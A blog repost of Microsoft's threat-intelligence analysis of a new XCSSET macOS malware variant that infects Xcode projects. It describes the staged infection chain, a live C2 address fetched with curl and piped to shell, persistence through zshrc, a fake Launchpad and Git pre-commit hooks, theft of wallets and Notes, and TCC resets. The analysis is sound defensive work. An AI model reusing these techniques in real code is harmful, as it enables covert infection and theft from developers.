<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<style type=text/css>body{font-family:monospace;}</style>
	<title>New XCSSET malware adds new obfuscation, persistence techniques to infect Xcode projects</title>
	
	
	<link rel="stylesheet" href="/css/style.css">
	
	
</head>
<body>
	<header>
	==========================<br>
	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
	==========================
	<div style="float: right;">A Techi Personal Blog</div><br>
	<p>
	<nav>
			<a href="/"><b>Start</b></a>.
			
			
			<a href="/posts/"><b>Posts</b></a>.
			
			<a href="/categories/"><b>Categories</b></a>.
			
			<a href="/tags/"><b>Tags</b></a>.
			
	</nav>
	</p>
	
</header>

	
	<main>
		<article>
			<h1>New XCSSET malware adds new obfuscation, persistence techniques to infect Xcode projects</h1>
			<b><time>19.03.2025 00:00</time></b>
		       

			<div>
				<p>Microsoft Threat Intelligence has uncovered a new variant of XCSSET, a sophisticated modular macOS malware that infects Xcode projects, in the wild during routine threat hunting. Its first known variant since 2022, this latest XCSSET malware features enhanced obfuscation methods, updated persistence mechanisms, and new infection strategies. These enhanced features help this malware family steal and exfiltrate files and system and user information, such as digital wallet data and notes, among others.</p>
<p>XCSSET is known for infecting Xcode projects and runs while an Xcode project is being built. Since Xcode is typically used by software developers, we assess that the malware’s mode of infection and propagation leverages on the idea that project files are shared among developers building Apple or macOS-related applications.</p>
<p>While it has resemblances to older XCSSET variants, this new variant is characterized by its modular approach and encoded payloads. It also has improved error handling, and heavily uses scripting languages, UNIX commands, and legitimate binaries. These characteristics allow the malware to have a low profile on an affected device and even remain fileless whenever possible, thus making its detection and removal more challenging.</p>
<p>At the code level, the new XCSSET variant obfuscated its module names, making it difficult to determine the modules’ intent during static analysis. Its enhanced obfuscation techniques extend to its randomized approach for generating payloads to infect Xcode projects and for encoding its payloads. In addition, while older XCSSET variants only used xxd (hexdump) for encoding, the latest one also incorporates Base64. Other notable capabilities of this new variant include its three distinct persistence techniques, which ensure its payload launches whenever a new shell session is initiated or whenever a user is tricked into opening a fake Launchpad application or makes commits in Git, and a new infection method for where the malware places its payload in a target Xcode project. Our analysis also revealed that there are some modules in this new variant’s code that appear to be under development. Its command-and-control (C2) server is also active as of this writing and is downloading additional modules.</p>
<p>In this blog, we discuss how this variant’s different modules work together in achieving the malware’s goals. As part of Microsoft’s commitment to work with the security community to mitigate threats and improve security for all, we have shared these findings with Apple, who acknowledged and thanked us for the information. While we’re only seeing this new XCSSET variant in limited attacks as of this writing, we’re sharing our comprehensive analysis and providing best practices and recommendations more broadly so users and organizations can protect themselves against this threat.</p>
<h2 id="analyzing-the-latest-xcsset-variant">Analyzing the latest XCSSET variant</h2>
<p>The new XCSSET variant generally follows a four-stage infection chain, with the fourth-stage payload running various sub-routines. The following sections provide detailed descriptions of each of these modules.</p>
<h3 id="first-stage-xcode-shell-payload">First stage: Xcode shell payload</h3>
<p>The payload referenced in this stage gets launched when a user unknowingly builds an infected Xcode project. This obfuscated payload passes through three iterations of a hex decoder and is then piped—or served as input—to shell.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-1.-Obfuscated-first-stage-shell-payload.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 1. Obfuscated first-stage shell payload</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The decoded payload simply makes a curl request to a C2 server, <em>https[:]//bulknames[.]ru/a</em>. The response it receives is then piped to shell.</p>
<h3 id="second-stage-obfuscated-shell-command">Second stage: Obfuscated shell command</h3>
<p>This payload, which was downloaded by the first-stage shell, collects the affected user’s device operating system information, which it then sends to the C2 server along with a default identifier/tag to download an additional payload. It then pipes the downloaded payload to the shell for execution.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-2.-The-second-stage-command-sent-to-the-C2-server.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 2. The second-stage command sent to the C2 server</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<h3 id="third-stage-downloaded-shell-payload">Third stage: Downloaded shell payload</h3>
<p>This stage again involves a shell script that first checks if the device’s version of XProtect, the built-in antivirus in macOS, is less than 5287. This check is done by running the command “xprotect version” and reading the <em>Info.plist</em> file of the XProtect bundle.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-3.-Third-stage-shell-script.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 3. Third-stage shell script</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The script then checks and stops any of the referenced processes in Figure 3 and any running osascript processes. It then calculates the date and searches for a hidden file named <em>.a</em> in the home folder. If it finds the file, it updates the said file; otherwise, it creates a new file with the date and other counters/markers.</p>
<p>The script then deletes any existing references to <em>/tmp/l.app</em> and creates a new one. It then downloads another script from the C2 server and saves it at the location <em>/tmp/b</em>. Next, it creates an AppleScript compiled application using osacompile. This AppleScript payload launches the downloaded <em>/tmp/b</em> script.</p>
<p>The script then uses the <em>plutil</em> command to modify the <em>Info.plist</em> file of the created AppleScript application to enable the <em>LSUIElement</em> key. Enabling this key hides the application from the Dock, effectively making the application more of a background process. Finally, the script runs the application in the background, sleeps for 10 seconds, and removes the created application and the <em>/tmp/b</em> script.</p>
<h3 id="fourth-stage-applescript-payload-tmpb-or-looz">Fourth stage: AppleScript payload (<em>/tmp/b</em> or <em>looz</em>)</h3>
<p>The fourth stage involves the execution of the created AppleScript application, which essentially runs a shell command. This command passes a Base64-encoded blob through several iterations of a Base64 decoder to obtain the final script, which is subsequently executed.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-23.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 4. Base64-encoded fourth-stage AppleScript payload</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The decoded script is another AppleScript that first parses the <em>com.apple.launchservices.secure.plist</em> file to determine the default browser for <em>https</em> URLs. It searches for the “https” URL scheme and extracts the corresponding browser’s bundle identifier. The script has explicitly set the variable to “Safari (com.apple.safari)” by default.</p>
<p>The script then fetches the following system information, which it sends to the C2 server as a single string:</p>
<ul>
<li>
<p>macOS version</p>
</li>
<li>
<p>Safari version</p>
</li>
<li>
<p>User locale</p>
</li>
<li>
<p>Firewall status</p>
</li>
<li>
<p>System Integrity Protection (SIP) status</p>
</li>
<li>
<p>CPU information</p>
</li>
</ul>
<p>The script also overrides the default <em>log()</em> function so that it can send logs to the C2 server—a capability that can also be seen across the various sub-modules the script launches. The next section provides more information about the sub-modules the script downloads from the C2 server as of this writing.  </p>
<p>The script then checks if the user name is “demo,” possibly to verify if the user account belongs to the threat actor. If the user name checks out, the script processes a specific module, <em>cozfi_xhh</em>, and returns. It also checks the device serial number and exits if the value contains “JV3Q” in it. Next, it calls the <em>boot()</em> function repeatedly with multiple obfuscated module names.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-5.-The-boot-function-of-the-AppleScript-payload.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 5. The boot() function of the AppleScript payload</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The <em>boot()</em> function has multiple filters with predefined logic and handlers for the module names passed in the argument. In case the module name doesn’t pass any filter, a code in the <em>boot()</em> function downloads an AppleScript that is then launched directly to avoid any artifacts on the disk. Depending on the wait flag passed to this function, the newly downloaded AppleScript is run in either background or foreground.</p>
<h3 id="sub-modules">Sub-modules</h3>
<p>The sub-modules that the fourth-stage script downloads follow the similar format where a Base64-encoded blob is passed through multiple iterations of a Base64 decoder before being launched directly.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-25.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 6. Format of the encoded sub-modules</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<h4 id="seizecj-steals-system-information">seizecj (Steals system information)</h4>
<p>This sub-module exfiltrates system information to the C2 server. The information it retrieves includes:</p>
<ul>
<li>
<p>Applications list</p>
</li>
<li>
<p>System applications list</p>
</li>
<li>
<p>User level LaunchAgents list</p>
</li>
<li>
<p>XProtect version</p>
</li>
<li>
<p>Malware Removal Tool (MRT) version</p>
</li>
</ul>
<h4 id="fpzfcieoci-lists-browser-extensions">fpzfcieoci (Lists browser extensions)</h4>
<p>This sub-module searches for and lists down the various internet browser extensions it finds installed on the affected device. It has a predefined list of search strings that correspond to the folder paths and files of the browsers that it searches for:</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-26.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 7. Browser’s path list</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>This sub-module processes each path individually to search for specific files and extracts metadata about the browser extensions. For example, for Firefox, it extracts lines containing “extensions.webextensions.ExtensionStorageIDB” from the file <em>prefs.js</em> file. For the other browsers, it searches the <em>manifest.json</em> file and extracts the lines containing either “default_title” or “name”. It then stores the extension list in a log file named <em>/tmp/out.txt</em> and uploads this file to the C2 server.</p>
<h4 id="hxasoxtfd-downloads-an-additional-module">hxasoxtfd (Downloads an additional module)</h4>
<p>This sub-module is a downloader that requests a module name from the C2 server every 120 seconds.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-20.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 8. doMain() function of the module</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>If a module name is received from the C2 server, the system proceeds to call the <em>boot()</em> function with the received module name. This function includes filters on the module name, similar to those observed in the parent (fourth-stage) payload. In case the filters don’t pass, this sub-module proceeds to download and launch directly the payload received from the C2, again to avoid any artifacts on the disk.</p>
<h4 id="txzx_vostfdi-steals-digital-wallet-data-from-browsers">txzx_vostfdi (Steals digital wallet data from browsers)</h4>
<p>This sub-module first sends a request to retrieve a path list from the C2 server. The following screenshot is an example of a path list received from the C2:</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-27.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 9. Path list received from C2 server</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Based on the specified paths, this sub-module appears to search for many cryptocurrency digital wallet extensions across various browsers and their directories. This information is primarily determined by examining the identifiers, such as the following:</p>
<table>
  <thead>
      <tr>
          <th><strong>Digital wallet extension</strong></th>
          <th><strong>Identifier</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>MetaMask</td>
          <td>nkbihfbeogaeaoehlefnkodbefgpgknn   ejbalbakoplchlghecdalmeeeajnimhm</td>
      </tr>
      <tr>
          <td>TokenPocket</td>
          <td>mfgccjchihfkkindfppnaooecgfneiii</td>
      </tr>
      <tr>
          <td>TronLink</td>
          <td>ibnejdfjmmkpcnlpebklmnkoeoihofec </td>
      </tr>
      <tr>
          <td>BNB Chain Wallet</td>
          <td>fhbohimaelbohpjbbldcngcnapndodjp</td>
      </tr>
      <tr>
          <td>Phantom Wallet</td>
          <td>bfnaelmomeimhlpmgjnjophhpkkoljpa</td>
      </tr>
  </tbody>
</table>
<p>This sub-module archives the collected data, which it then sends back to the C2 server.</p>
<h4 id="hfdieiz-establishes-persistence">hfdieiz (Establishes persistence)</h4>
<p>This sub-module establishes persistence through two different methods, <strong>zshrc</strong> and <strong>Dock</strong>, which will be discussed in the following sections. It first creates a folder named <em>com.apple.finder</em> in the <em>~/Library/Caches/</em> directory.</p>
<p>This sub-module generates payload by randomly selecting a C2 server from a predefined list and selecting an encoding method, which is either Base64 or xxd. It then chooses the number of iterations required to encode or decode the payload. The final encoded payload is then generated and returned. The argument received in the function is placed as a marker at “p=” in the payload request.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-10.-Payload-generation-function-of-the-persistence-sub-module.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 10. Payload generation function of the persistence sub-module</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p><strong>zshrc method</strong></p>
<p>In this persistence method, the sub-module first checks the value of the <em>RESTORE_DEFAULT</em> global variable. If the value is set to “True”, the sub-module deletes the <em>~/.zshrc_aliases</em> file; otherwise, it retrieves the payload body and saves it to the <em>~/.zshrc_aliases</em> file. The subsequent payload involves verifying the existence of the <em>.zshrc_aliases</em> file and executing it if it is present. The script then ensures that the <em>~/.zshrc</em> file exists. It searches for the presence of the string “.zshrc_aliases” within this file and appends the final payload if it is absent. This persistence method guarantees the execution of the payload whenever a new shell session is created.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-29.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 11. zshrc persistence method</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p><strong>Dock method</strong></p>
<p>In this persistence method, the sub-module first downloads a signed <em>dockutil</em> tool from the C2 server. This tool is mainly used to manage dock items, such as adding, deleting, and updating entries. The sub-module then gets the list of dock items and searches for Launchpad in it. If it finds an entry, it proceeds to call the <em>processItem</em> function, which then creates a fake Launchpad application in the <em>~/Library/Caches/com.apple.finder</em> folder.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-12.-Creation-of-the-fake-Launchpad-application-and-file-URI-replacement.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 12. Creation of the fake Launchpad application and file URI replacement</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The <em>processItem</em> function proceeds to get the corresponding payload application body from <em>getPayloadForApp()</em> function, which then initially verifies whether the passed application name is “Launchpad.” If it is, then the payload body for Launchpad is retrieved using the <em>getPayloadBody()</em> function.</p>
<p>In the <em>getPayloadForApp()</em> function, the final payload is configured to first invoke the legitimate Launchpad application and then launch the generated malicious payload. The final payload body is then returned to the <em>processItem</em> function.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-19.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 13. Function to create payload for the application</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The <em>processItem</em> function also has a logic to update the persisted payload in case it is already found on the device. If the device has no prior infection, the function first compiles an AppleScript payload to an application with the “run-only” flag. This flag could make it challenging to reverse engineer the code and evade static analysis. The function then saves the payload to a file in the parent directory. Next, it checks if the application name is “Launchpad” and, if it is, modifies the <em>Info.plist</em> file’s entries to enable the <em>LSUIElement</em> key and update <em>CDBundleDisplayName</em>. It then downloads <em>InfoPlist.locatable</em> and Launchpad’s icon from the C2 server, replaces the created application’s icon with it, and performs an ad-hoc signing on the application.</p>
<p>Finally, the <em>processItem</em> function uses the <em>dockutil</em> binary to replace the existing Launchpad entry with the fake Launchpad’s application path. It does this by replacing the file URI entry of the legitimate Launchpad application with the fake one. These steps ensure that every time the user starts Launchpad from the dock, the malicious created application is launched, which then runs both the legitimate Launchpad and the generated payload.</p>
<h4 id="cozfi_xhh-steals-notes-from-the-notes-application-">cozfi_xhh (Steals notes from the Notes application )</h4>
<p>This sub-module steals notes from the affected device’s Notes application through a JavaScript payload.</p>
<p>It initializes a variable named <em>permissionApp</em> to path to <em>/Applications/Reminders.app</em>, where the fake Reminders application is created, and to <em>/Applications/Reminders.app/Notes/</em>, where the stolen notes are saved. It is important to note that the legitimate Reminders application can be found in the <em>/System/Applications</em> directory. The sub-module then removes the <em>Notes</em> folder if it exists inside the fake Reminders application. It also checks for the presence of the fake Reminders application on the device and creates one if it’s not present.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-31.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 14. Creation of AppleScript-compiled application to launch a malicious JavaScript payload that steals notes</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>This sub-module creates an AppleScript-compiled application with the flag set to “Run only.” This application’s script launches the <em>/tmp/.n</em> file using osascript. The sub-module then downloads an icon file from the C2 server. Next, it modifies the <em>Info.plist</em> file by updating the <em>CFBundleDisplayName</em> and <em>CFBundleExecutable</em> and enabling the <em>LSUIElement</em> key. Finally, it performs an ad-hoc signing for this newly created application.</p>
<p>After the creation of the application, the sub-module checks the global variable FORCED flag, which is set to “False” by default in the script. If the FORCED flag is set to “True”, the sub-module calls the <em>exec</em> function directly. Otherwise, it first sends a request to the C2 server to obtain a folder list. The code expects to receive “notes_app” in the response. If this application is present, it enters a loop, waiting for the Notes application to start before calling the <em>exec</em> function. The <em>exec</em> function then subsequently calls the <em>runloop</em> function.</p>
<p>The <em>runloop</em> function first sets the payload, which is basically a JavaScript code. Meanwhile, the <em>run()</em> function of the JavaScript payload first checks and connects to the Notes application present in the <em>Systems</em> directory, retrieves all notes, and saves each note’s contents, creation date, and modification date into an HTML file in the <em>Notes</em> folder within the Reminders application created previously.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-15.-JavaScript-payload-that-steals-notes-from-the-affected-device.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 15. JavaScript payload that steals notes from the affected device</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The sub-module saves the JavaScript payload into the <em>/tmp/.n</em> file. It then launches the Reminders application to run the said payload. It checks for the existence of <em>Notes</em> folder and, if absent, retries up to three times by resetting the Transparency, Consent, and Control (TCC) database for AppleEvents before deleting the created Reminders application. If the <em>Notes</em> folder exists, it returns a “200” code. When the sub-module’s parent function receives the said “200” code, it archives the <em>Notes</em> folder within the created fake Reminders application and exfiltrates it to the C2 server.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-33.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 16. Retry method of resetting TCC database</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<h3 id="modules-listed-under-findermodules-list-in-boot-function">Modules listed under <em>finderModules</em> list in <em>boot()</em> function</h3>
<p>In the <em>boot()</em> function of the fourth-stage AppleScript module, there is a specific handler code for certain modules found under the <em>finderModules</em> list.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-34.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 17. Handler for modules defined in finderModules list</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Figure 17 shows how the fourth-stage payload downloads the module passed to the <em>boot()</em> function into the <em>/tmp/.f</em> file. It then calls the <em>boot()</em> function again with a specific module named <em>vectfd_xhh</em>.</p>
<p>Let’s first look at the common module invoked for each of the other modules on the list.</p>
<h4 id="vectfd_xhh-launches-application-for-modules">vectfd_xhh (Launches application for modules)</h4>
<p>In this module, the <em>doMain()</em> function checks the existence of either Xcode or Git. If either application is found, several global variables are set with a certain application’s display name, file path, and icon name.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-35.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 18. Selection of launcher application for creation</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>If neither application is present, the module defaults to <em>Finder.app</em>. Subsequently, the <em>doInstall()</em> function is called for each case. It should be noted that the legitimate Finder and Terminal applications are located in the <em>/System/Applications/</em> folder and not in <em>/Applications/</em>.</p>
<p>In the <em>doInstall()</em> function, the existence and version of the fake application in context is first checked. If the fake application isn’t present or is outdated:</p>
<ul>
<li>
<p>If the current process in context is Xcode or Finder, the module waits for the corresponding legitimate application to launch first before calling the <em>createLoop()</em> function</p>
</li>
<li>
<p>If the current process in context is Terminal, the module directly calls the <em>createLoop()</em> function</p>
</li>
</ul>
<p>The <em>createLoop()</em> function deletes any prior existence of the application before creating the fake one. The created application is AppleScript-compiled with the flag set to “Run only,” and it executes a script located at <em>/tmp/.i</em>. Similar to the previous fake application-creating modules, the created application’s icon and <em>plist</em> entries are modified, and is ad-hoc signed.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-19.-Payload-of-the-launcher-application-that-launches-the-main-module-to-be-executed.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 19. Payload of the launcher application that launches the main module to be executed</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The module then calls the <em>runAppFile()</em> function. This function first sets a payload where it attempts to get a listing of the user’s directories, possibly to check TCC permissions. If the command succeeds, this function deletes any existing error file (<em>/tmp/.e</em>); otherwise, it creates the file. The payload then launches the <em>/tmp/.f</em> file that was downloaded in the parent (fourth-stage) module.</p>
<p>Next, the <em>runAppFile()</em> function saves the payload it set initially in the <em>/tmp/.i</em> file and launches the created application. This created application in turn launches the <em>/tmp/.i</em> file, which, in turn, also executes the <em>/tmp/.f</em> file.</p>
<p>If the directory listing command isn’t successful, the error file is created. If this error file exists, the function returns code “403”. If the parent function receives this code, it retrieves the <em>CFBundleIdentifier</em> of the created application, resets the TCC database for that bundle ID, and calls the <em>createLoop()</em> function again.</p>
<h4 id="dfhsebxzod-infects-xcode-projects">dfhsebxzod (Infects Xcode projects)</h4>
<p>This module, which is launched by the launcher module <em>vectfd_xhh,</em> is designed to infect Xcode projects located on the target device. It initially retrieves the user’s home directory and subsequently invokes two distinct functions to search and process files.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-20.-Searching-Xcode-projects-in-a-target-folder.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 20. Searching Xcode projects in a target folder</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>The first function searches for <em>xcodeproj</em> directories, excluding certain specified directories. The other function downloads a binary, presumed to be a 7-Zip binary, from the C2 server. It then searches the <em>HOME</em> folder, excluding specified directories, for <em>.zip</em> files. When it finds these <em>.zip</em> files, it scans the archive listing for “xcodeproj.” If it finds this entry, the module contains a logic to extract the project files, modify them, and update the archive with the modified files.</p>
<p>For both functions, each directory or file match triggers a subsequent function that searches for a <em>.pbxproj</em> file within the given directory. This new function then randomly selects one of three infection methods: RULE, TARGET, or FORCED_STRATEGY. The infection method determines how the payload will be placed and referenced in the <em>.pbxproj</em> file.</p>
<p>An example infection method that wasn’t mentioned in previously published research is part of FORCED_STRATEGY method. This method includes the use of <em>TARGET_DEVICE_FAMILY</em> variable under Build Settings, which contains the generated payload.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/Figure-21.-FORCED_STRATEGY-method-of-infecting-a-pbxproj-file.webp" alt="A screenshot of a computer program" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 21. FORCED_STRATEGY method of infecting a pbxproj file</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Next, it adds a <em>PBXShellScriptBuildPhase</em> in the <em>.pbxproj</em> file where the payload will be present in the shellScript key.</p>
<p>The payload generation was done in a separate function where it first defines three specific domains and randomly selects one from them. It uses either the xxd or Base64 encoding method, also chosen at random.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-39.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 22. Function to generate a payload that infects a pbxproj file</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>This method also selects a random value between 2 and 5 to determine the number of iterations for encoding/decoding. The first payload includes an encoded curl request to the specified C2 server, the output of which is piped to the shell for execution. The final payload, which consists of the above encoded data and a decoding string, is also piped to shell for execution.</p>
<h4 id="jez-establishes-persistence-through-git-commits">jez (Establishes persistence through Git commits)</h4>
<p>This module attempts to establish persistence by incorporating its payload into the pre-commit hooks within the <em>.git</em> directory of projects located on the device.</p>
<!-- raw HTML omitted -->
<p>
<figure>
  <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-40.webp" alt="A screenshot of a computer code" />
</figure>


</p>
<!-- raw HTML omitted -->
<p><em>Figure 23. Infection of hooks/pre-commit file in Git’s directory</em></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>It searches for <em>.git</em> folders the in the user’s home directory and sub-directories using the <em>find</em> command. It searches up to six levels of sub-directories and excludes those named <em>Movies</em>, <em>Library</em>, <em>Music</em>, and <em>Pictures</em>. For each <em>.git</em> directory found, this module checks for the presence of the <em>hooks/pre-commit</em> file within those directories. If it finds the file, it removes any existing payload content and appends the newly created payload.</p>
<p>If the module doesn’t find the <em>pre-commit</em> file, it creates the file and writes the payload within it. The process for generating the payload is similar to the <strong>zshrc</strong> and <strong>Dock</strong> persistence techniques discussed in the previous sections of this blog. This persistence method ensures the execution of the payload upon each commit action in the project.</p>
<h3 id="filedata-exfiltration-modules-assessed-to-be-in-development">File/Data exfiltration modules assessed to be in development</h3>
<h4 id="uhsoxtfd_vostfd-directory-uploader">uhsoxtfd_vostfd (Directory uploader)</h4>
<p>This module is designed to exfiltrate files from a specified target folder. It appears to be in the development phase as of this writing because the specified target folder is currently set to <em>~/Desktop/test</em>.</p>
<p>This module first verifies the existence of the target folder and exits if it can’t find the said folder. Otherwise, it lists the folder’s contents to test access permissions. If access is denied, the module runs a recursive loop to reset the TCC database for directories such as <em>Desktop</em>, <em>Downloads</em>, and <em>Documents</em>.</p>
<p>Once folder access is granted, the module archives the folder, excluding certain files such as links, patterns listed in the exclusion list, and files exceeding a specified size. It then uploads the created archive to a C2 server. Once the exfiltration is complete, the module deletes the archive.</p>
<h4 id="fpfb-directory-listing">fpfb (Directory listing)</h4>
<p>This module runs a predefined command and uploads the result of the said command back to the C2 server. Currently, the command is set to “ls -la ~/Desktop”, which lists the files and directories in the user’s <em>Desktop</em> folder.</p>
<h4 id="vectfd-specific-files-exfiltration">vectfd (Specific files exfiltration)</h4>
<p>This module retrieves files that match the pattern defined in the <em>INAME_QUERY</em> variable within the user’s home directory. Currently, it searches for files with the pattern “*test.txt,” which indicates that the module might be under development. It also excludes files located in certain directories and files that exceed its size restrictions. The module then creates an archive of the files it retrieves, sends the archive to a C2 server, and deletes the archive.</p>
<h2 id="mitigation-and-protection-guidance">Mitigation and protection guidance</h2>
<p>Defenders can take the following mitigation steps to defend against this threat:</p>
<ul>
<li>
<p>Run the latest version of your operating systems and applications. Deploy the latest security updates as soon as they become available.</p>
</li>
<li>
<p>Always inspect and verify Xcode projects downloaded or cloned from repositories, as the malware usually spreads through infected projects.</p>
</li>
<li>
<p>Encourage users to use web browsers that support Microsoft Defender SmartScreen like Microsoft Edge—available on macOS and various platforms—which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware.</p>
</li>
<li>
<p>Use Microsoft Defender for Endpoint on Mac, which detects, stops, and quarantines the malware discussed in this blog</p>
</li>
</ul>
<p>Microsoft Defender for Endpoint customers can also apply the following mitigations to reduce the environmental attack surface and mitigate the impact of this threat and its payloads:</p>
<ul>
<li>
<p>Turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.</p>
</li>
<li>
<p>Enable potentially unwanted application (PUA) protection in block mode to automatically quarantine PUAs like adware. PUA blocking takes effect on endpoint clients after the next signature update or computer restart. PUA blocking takes effect on endpoint clients after the next signature update or computer restart.</p>
</li>
<li>
<p>Turn on network protection to block connections to malicious domains and IP addresses.</p>
</li>
</ul>
<h2 id="microsoft-defender-xdr-detections">Microsoft Defender XDR detections</h2>
<p>Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.</p>
